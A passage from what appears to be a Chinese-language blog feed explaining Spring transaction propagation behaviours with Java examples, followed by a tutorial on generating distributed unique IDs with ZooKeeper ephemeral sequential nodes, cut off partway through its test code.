（必须有）</p><p>如果当前存在事务，则加⼊该事务；如果当前没有事务，则创建⼀个新的事务。</p><p>2 <strong>SUPPORTS</strong> （可有可无）</p><p>如果当前存在事务，则加⼊该事 务；如果当前没有事务，则以⾮事务的⽅式继续运⾏。</p><p>3 <strong>MANDATORY</strong> （强制）</p><p>如果当前存在事务，则加⼊该事务；如果当前没有事务，则抛出异常。（mandatory：强制性）</p><p>不支持当前事务</p><p>4 <strong>REQUIRES_NEW</strong></p><p>创建⼀个新的事务，如果当前存在事务，则把当前事务挂起。</p><p>5 <strong>NOT_SUPPORTED</strong></p><p>以⾮事务⽅式运⾏，如果 当前存在事务，则把当前事务挂起。</p><p>6 <strong>NEVER</strong></p><p>以⾮事务⽅式运⾏，如果当前存在事务，则抛出异常。</p><p>其他</p><p>7 <strong>NESTED</strong></p><p>如果当前存在事务，则创建⼀个事务 作为当前事务的嵌套事务来运⾏；如果当前没有事务，则该取值等价于 REQUIRED。即新创建事务。</p><h4 id="事务传播机制demo示例"><a href="#事务传播机制demo示例" class="headerlink" title="事务传播机制demo示例"></a>事务传播机制demo示例</h4><h5 id="REQUIRED"><a href="#REQUIRED" class="headerlink" title="REQUIRED"></a><strong>REQUIRED</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于testMain方法存在事务且调用testB方法，testB方法的事务会加入testMain的事务之中。testB抛出运行异常所以testMain方法和testB方法都会回滚。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于testMain没有事务所以testB会新创建一个事务，testB方法发生回滚。</p><h5 id="SUPPORTS"><a href="#SUPPORTS" class="headerlink" title="SUPPORTS"></a>SUPPORTS</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.SUPPORTS)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于testMain方法没有事务，testB将以非事务运行，B（b1）将执行，B（b2）不执行。</p><h5 id="MANDATORY"><a href="#MANDATORY" class="headerlink" title="MANDATORY"></a><strong>MANDATORY</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.MANDATORY)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testB方法将直接抛出异常，B（b1）方法不执行。</p><h5 id="REQUIRES-NEW"><a href="#REQUIRES-NEW" class="headerlink" title="REQUIRES_NEW"></a><strong>REQUIRES_NEW</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRES_NEW)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testMain方法发生回滚，testB方法成功执行。</p><h5 id="NOT-SUPPORTED"><a href="#NOT-SUPPORTED" class="headerlink" title="NOT_SUPPORTED"></a><strong>NOT_SUPPORTED</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.NOT_SUPPORTED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testB方法中没有事务，B(b1)方法成功执行。testMain方法回滚，A（a1）不执行。</p><h5 id="NEVER"><a href="#NEVER" class="headerlink" title="NEVER"></a>NEVER</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.NEVER)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于testMain方法存在事务，testB方法将抛出异常，testMain方法发生回滚所有方法都不执行。</p><h5 id="NESTED"><a href="#NESTED" class="headerlink" title="NESTED"></a>NESTED</h5><p>如果当前存在事务，则在嵌套事务(创建子事务)内执行。如果当前没有事务，则执行与PROPAGATION_REQUIRED类似的操作。</p><ul><li>和REQUIRES_NEW的区别</li></ul><blockquote><p>REQUIRES_NEW是新建一个事务并且新开启的这个事务与原有事务无关，而NESTED则是当前存在事务时（我们把当前事务称之为父事务）会开启一个嵌套事务（称之为一个子事务）。<br>在NESTED情况下父事务回滚时，子事务也会回滚，而在REQUIRES_NEW情况下，原有事务回滚，不会影响新开启的事务。</p></blockquote><ul><li>和REQUIRED的区别</li></ul><blockquote><p>REQUIRED情况下，调用方存在事务时，则被调用方和调用方使用同一事务，那么被调用方出现异常时，由于共用一个事务，所以无论调用方是否catch其异常，事务都会回滚<br>而在NESTED情况下，被调用方发生异常时，调用方可以catch其异常，这样只有子事务回滚，父事务不受影响</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    testB();    <span class="comment">//调用testB</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.NESTED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testMain方法和testB方法都不会执行，父事务回滚子事务也会发生回滚。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.REQUIRED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A(a1);  <span class="comment">//调用A入参a1</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        testB();    <span class="comment">//调用testB</span></span><br><span class="line">    &#125;<span class="keyword">catch</span>（Exception e)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    A(a2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Transactional</span>(propagation = Propagation.NESTED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testB</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B(b1);  <span class="comment">//调用B入参b1</span></span><br><span class="line">    <span class="keyword">throw</span> RuntimeException;     <span class="comment">//发生异常抛出</span></span><br><span class="line">    B(b2);  <span class="comment">//调用B入参b2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testMain方法捕获了testB方法的异常，所以只有子事务发生回滚。</p><p><img src="../img/spring/spring事务传播requires_new.png" alt=""></p><p>注意：虽然是2个事务，但由于方法a()抛出异常，test()方法内调用，相当于test方法内抛出了异常，所以事务回滚2个事务的方法都不执行。</p><p><img src="../img/spring/spring事务传播requires_new1.png" alt=""></p><p>该情况a()方法将执行，test()方法将回滚。</p><p>待续….</p>]]></content>
      
      
      <categories>
          
          <category> spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper案例-分布式全局唯一ID生成</title>
      <link href="/2021/07/05/Zookeeper%E6%A1%88%E4%BE%8B-%E5%88%86%E5%B8%83%E5%BC%8F%E5%85%A8%E5%B1%80%E5%94%AF%E4%B8%80ID%E7%94%9F%E6%88%90/"/>
      <url>/2021/07/05/Zookeeper%E6%A1%88%E4%BE%8B-%E5%88%86%E5%B8%83%E5%BC%8F%E5%85%A8%E5%B1%80%E5%94%AF%E4%B8%80ID%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在单体架构中，我们通常使用数据库字段自带的自增auto_increment属性来自动为每一条记录生成唯一的ID，但是当我们采用分布式系统后，特别是分库分表后，就无法再依靠数据库的auto_increment属性来唯一标识一条记录，这就需要采用其他方法来生成全局唯一ID。</p><p>在zookeeper中，它提供了一种以创建临时有序节点来获取到全局唯一ID，它能保证在整个分布式系统中的全局唯一性。</p><h2 id="项目demo地址"><a href="#项目demo地址" class="headerlink" title="项目demo地址"></a>项目demo地址</h2><h2 id="案例实现"><a href="#案例实现" class="headerlink" title="案例实现"></a>案例实现</h2><p>实现步骤：</p><ul><li>1、客户端连接到zookeeper服务器端；</li><li>2、客户端在指定路径下生成临时有序节点；</li><li>3、取出序列号，这就是分布式全局唯一ID；</li></ul><h3 id="zookeeper实现"><a href="#zookeeper实现" class="headerlink" title="zookeeper实现"></a>zookeeper实现</h3><p>1、引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    排除zk依赖的log4j和slf4j，使用springboot提供的logback    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZookeeperUniqueID</span> <span class="keyword">implements</span> <span class="title">Watcher</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 计数器对象 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CountDownLatch countDownLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 连接对象 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ZooKeeper zooKeeper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String IP = <span class="string">"127.0.0.1:2181"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 用户生成序号的节点 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String DEFAULT_PATH = <span class="string">"/uniqueId"</span>;</span><br><span class="line">    <span class="comment">/** 根节点 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String ROOT_PATH = <span class="string">"/uniqueId"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZookeeperUniqueID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zooKeeper = <span class="keyword">new</span> ZooKeeper(IP, <span class="number">6000</span>, <span class="keyword">this</span>);</span><br><span class="line">            <span class="comment">//等待zk正常连接后，往下走程序</span></span><br><span class="line">            countDownLatch.await();</span><br><span class="line">            <span class="comment">// 判断根节点是否存在</span></span><br><span class="line">            Stat stat = zooKeeper.exists(ROOT_PATH, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (stat == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建一下根节点</span></span><br><span class="line">                zooKeeper.create(ROOT_PATH, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>], ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//EventType = None时</span></span><br><span class="line">            <span class="keyword">if</span> (watchedEvent.getType() == Event.EventType.None) &#123;</span><br><span class="line">                <span class="keyword">if</span> (watchedEvent.getState() == Event.KeeperState.SyncConnected) &#123;</span><br><span class="line">                    log.info(<span class="string">"连接成功"</span>);</span><br><span class="line">                    countDownLatch.countDown();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (watchedEvent.getState() == Event.KeeperState.Disconnected) &#123;</span><br><span class="line">                    log.info(<span class="string">"断开连接"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (watchedEvent.getState() == Event.KeeperState.Expired) &#123;</span><br><span class="line">                    log.info(<span class="string">"会话超时"</span>);</span><br><span class="line">                    <span class="comment">// 超时后服务器端已经将连接释放，需要重新连接服务器端</span></span><br><span class="line">                    zooKeeper = <span class="keyword">new</span> ZooKeeper(IP, <span class="number">6000</span>, <span class="keyword">this</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (watchedEvent.getState() == Event.KeeperState.AuthFailed) &#123;</span><br><span class="line">                    log.info(<span class="string">"认证失败"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据 zk 临时有序节点，生成唯一ID</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 唯一ID</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUniqueId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String path = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">//创建临时有序节点</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = zooKeeper.create(ROOT_PATH + DEFAULT_PATH, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>], ZooDefs.Ids.OPEN_ACL_UNSAFE,</span><br><span class="line">                    CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line">            log.info(<span class="string">"zk创建临时有序节点：&#123;&#125;"</span>, path);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//截取defaultPath的长度</span></span><br><span class="line">        <span class="keyword">return</span> path.substring(ROOT_PATH.length() + DEFAULT_PATH.length());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZookeeperUniqueIDTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试 zk 生成唯一ID</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUniqueId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ZookeeperUniqueID zookeeperUniqueID = <span class="keyword">new</span> ZookeeperUniqueID();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">"分布式唯一ID:"</span> + zookeeperUniqueID.getUniqueId());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试 zk 生成唯一ID（多线程下）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUniqueIdForMore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ZookeeperUniqueID zookeeperUniqueID = <span class="keyword">new</span> ZookeeperUniqueID();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"分布式唯一ID:"</span> + zookeeperUniqueID.getUniqueId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"thread-0"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"分布式唯一ID:"</span> + zookeeperUniqueID.getUniqueId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"thread-1"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"分布式唯一ID:"</span> + zookeeperUniqueID.getUniqueId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"thread-2"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//睡眠，用以保证有充足的时间执行</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span 